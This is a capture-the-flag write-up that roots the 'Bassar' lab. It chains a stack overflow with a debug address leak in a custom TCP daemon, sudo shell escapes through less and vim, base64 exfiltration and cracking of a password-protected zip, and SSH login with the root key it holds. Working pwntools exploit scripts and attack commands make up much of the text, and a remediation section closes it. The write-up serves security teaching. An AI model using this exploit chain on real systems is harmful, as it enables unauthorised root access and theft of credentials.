# Bassar — stack overflow in a forge daemon to a chained root

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/bassar/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A custom TCP service on port 9999 (`jail v1.0`) has a classic
> stack buffer overflow: it reads 255 bytes into a 16-byte buffer, and an
> undocumented `DEBUG` command leaks both the buffer address and the address of
> an in-binary `shell()` gadget. Overwriting the saved return address with
> `shell()` drops a connect-back shell. From there, three GTFOBins-style sudo
> hops (`less` → `vim`) climb to the `adm` group, which can read a password-
> protected `keys.zip`. Cracking it (`Morris1962!`) yields an SSH private key
> for root. **Flag:** `/root/root.txt` → `NCTF{…}` (lab-rotated).

## 1. Briefing

Boot2root, difficulty *insane*. A single flag at `/root/root.txt`, readable
only by root. The entry point is a bespoke network service, not a web app.

| Field | Value |
|-------|-------|
| Target | `10.100.13.100` (ephemeral lab) |
| Service | `nc 10.100.13.100 9999` — `jail v1.0` |
| Surfaces | custom auth daemon, local sudo rules, FTP/SSH |
| Flag format | `NCTF{...}` |

A `README.txt` recovered from an FTP drop hints at the service:

```
Bassar forge - dev drop
build: ./compile.sh
service: nc bassar.local 9999
```

## 2. Reconnaissance

```bash
nc 10.100.13.100 9999
# jail v1.0
# cmd> AAAA
# Password: AAAA
# Denied
```

The banner asks for a command, then a password. Two inputs, a fixed prompt
order, and a hard `Denied` on a bad password — a native binary. The dev drop on
FTP also leaked the source (`jail.c`), which makes the bug and the gadget
explicit.

### 2.1 The vulnerable source

```c
void shell(void) {
    dup2(conn, 0); dup2(conn, 1); dup2(conn, 2);
    char *argv[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", argv, NULL);
}

void auth(void) {
    char userpass[16];
    char password[256];
    if (debug) printf("userpass @ %p shell @ %p\n", userpass, shell);
    printf("Password: ");
    ssize_t n = read(0, password, 255);   // up to 255 bytes
    if (n > 0) password[n] = 0x00;
    strcpy(userpass, password);           // into a 16-byte buffer → overflow
    ...
}

int main(void) {
    char cmd[16];
    read(0, cmd, 15);
    if (strncmp(cmd, "DEBUG", 5) == 0) debug = 1;   // address leak switch
    auth();
}
```

## 3. Analysis

Three facts combine into a trivial exploit:

1. **Overflow.** `read()` accepts 255 bytes, then `strcpy()` copies them into
   `userpass[16]`, smashing the saved RBP and the return address.
2. **Leak.** Sending `DEBUG` as the first command sets `debug=1`, so `auth()`
   prints the live stack address of `userpass` **and** the address of `shell()`.
   That defeats both ASLR and PIE for free — no libc, no ROP.
3. **Ready-made gadget.** `shell()` wires the socket fd to stdio and execs
   `/bin/sh`, so returning into it gives an interactive shell on the same
   connection.

`strcpy` stops at the first null byte, but that is not a problem here: the high
bytes of the `shell` address are `0x00`, and they land exactly where the
original return address already had `0x00`, so the copy terminates cleanly after
writing the full pointer.

## 4. Exploitation

### Step 1 — overflow to `shell()`

The source comment estimates the offset at 24; in practice GCC's 16-byte
alignment padding puts it at **40**.

```python
from pwn import *
import re

r = remote('10.100.13.100', 9999)
r.recvuntil(b'cmd> ')
r.send(b'DEBUG\n')                       # enable the address leak
leak = r.recvline()
shell_addr = int(re.search(rb'shell @ (0x[0-9a-f]+)', leak).group(1), 16)
r.recvuntil(b'Password: ')
r.send(b'A' * 40 + p64(shell_addr))      # pad + overwrite return address
r.interactive()
```

```text
$ id
uid=1001(jailuser) gid=1001(jailuser) groups=1001(jailuser)
```

### Step 2 — jailuser → frank (sudo less)

```bash
sudo -l
# (frank) NOPASSWD: /usr/bin/less /var/log/syslog
sudo -u frank /usr/bin/less /var/log/syslog
# inside the pager:
!/bin/bash
```

`less` can spawn a shell with `!cmd` (GTFOBins), so this runs `/bin/bash` as
`frank`.

### Step 3 — frank → adm (sudo vim)

```bash
sudo -u adm /usr/bin/vim /var/www/html/jailuser/dev/jail.c
# inside vim:
:!/bin/bash
```

Same pattern: `vim`'s `:!` escape runs a shell as `adm`.

### Step 4 — adm reads the key vault

`/var/adm/.keys/` is readable by the `adm` group. It holds a password-protected
`keys.zip` wrapping an SSH private key:

```bash
base64 -w0 /var/adm/.keys/keys.zip     # exfil over the shell, decode locally
```

Crack the zip offline:

```bash
zip2john keys.zip > keys.john
john --wordlist=rockyou.txt keys.john
# root_key:Morris1962!
unzip -P 'Morris1962!' keys.zip        # → root_key (OpenSSH private key)
```

### Step 5 — root_key → root

```bash
chmod 600 root_key
ssh -i root_key root@10.100.13.100
cat /root/root.txt
```

## 5. Flag

```text
NCTF{…}
```

(The lab rotates `/root/root.txt` on reset; the value is truncated here per the
site's flag policy.)

## 6. Dead ends & troubleshooting

- **Offset 24 fails.** The source comment is off by the alignment pad. If the
  overwrite lands short, step up to 40 (the value both of my working scripts
  used). A quick `cyclic`/`cyclic_find` on a crash confirms it.
- **No DEBUG = no exploit (cheaply).** Without the leak you would need an info
  leak or a brute of the low PIE bits. `DEBUG` makes it a two-line ret2shell.
- **`cp` the key out fails on permissions.** Don't copy the zip around on the
  box; `base64` it over the existing socket and crack it on your own machine.

## 7. Lessons & remediation

- **Never ship a debug leak.** The `DEBUG` switch printing live addresses is the
  whole game — strip debug paths from release builds.
- **Bound every copy.** `read(0, password, 255)` into `password[256]` is fine;
  the bug is the unchecked `strcpy` into `userpass[16]`. Use `snprintf`/
  `strlcpy` with the destination size, and compile with `-fstack-protector-strong`,
  PIE and full RELRO.
- **Sudo rules are privilege.** `less` and `vim` over a static path are shell
  escapes. Prefer purpose-built, non-interactive tools, or `sudoedit`, and keep
  `adm`-group secrets out of readable files.
- **Secrets don't belong on disk.** A crackable `keys.zip` holding a root SSH
  key turns a group-read into full compromise. Use an agent/HSM and per-host
  keys.

## 8. Appendix — full chain script

```python
#!/usr/bin/env python3
from pwn import *
import re, time, base64

TARGET, PORT, OFFSET = '10.100.13.100', 9999, 40

def shell():
    r = remote(TARGET, PORT)
    r.recvuntil(b'cmd> '); r.send(b'DEBUG\n')
    shell_addr = int(re.search(rb'shell @ (0x[0-9a-f]+)', r.recvline()).group(1), 16)
    r.recvuntil(b'Password: ')
    r.send(b'A' * OFFSET + p64(shell_addr))
    time.sleep(0.3); r.recvrepeat(timeout=1)
    return r

r = shell()
for cmd in (b'sudo -u frank /usr/bin/less /var/log/syslog\n', b'!/bin/bash\n',
            b'sudo -u adm /usr/bin/vim /var/www/html/jailuser/dev/jail.c\n', b':!/bin/bash\r\n'):
    r.send(cmd); time.sleep(1); r.recvrepeat(timeout=2)

r.send(b'base64 -w0 /var/adm/.keys/keys.zip; echo; echo END\n')
blob = r.recvuntil(b'END', timeout=10).decode(errors='replace')
best = max(re.findall(r'[A-Za-z0-9+/=]{50,}', blob), key=len)
open('keys.zip', 'wb').write(base64.b64decode(best))
# zip2john keys.zip | john --wordlist=rockyou.txt  →  Morris1962!
```
